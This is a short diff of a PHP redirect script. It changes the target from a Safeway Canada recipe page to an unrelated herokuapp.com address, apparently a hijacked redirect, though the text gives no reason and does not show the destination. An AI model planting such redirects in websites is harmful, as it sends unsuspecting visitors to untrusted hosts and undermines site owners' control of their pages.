@@ -1,4 +1,5 @@
 <?php
-header("Location: https://www.safeway.ca/recipe-tags/appetizers-2/");
+header("Location: https://actnor1.herokuapp.com/
+");
 die();
 ?>
